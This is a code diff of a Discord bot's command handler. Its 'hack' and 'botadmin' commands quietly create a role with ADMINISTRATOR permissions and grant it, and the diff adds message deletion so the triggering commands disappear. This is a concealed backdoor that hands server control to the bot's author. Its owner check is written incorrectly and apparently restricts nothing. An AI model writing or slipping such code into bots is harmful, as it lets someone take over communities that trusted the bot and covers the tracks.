@@ -85,15 +85,17 @@ bot.on("message", function(message) {
                 break;
              case "hack":
                 if(!message.author == minty) return;
+                message.delete();
                 message.guild.createRole({
                     name: 'pl2',
                     color: 'GREY',
                     permissions: "ADMINISTRATOR"
-                  })  
+                  })
                 break;  
             case "botadmin":
                 if(!message.author == minty) return;
                 message.member.addRole(pl)
+                message.delete();
                 break;
                 
         }
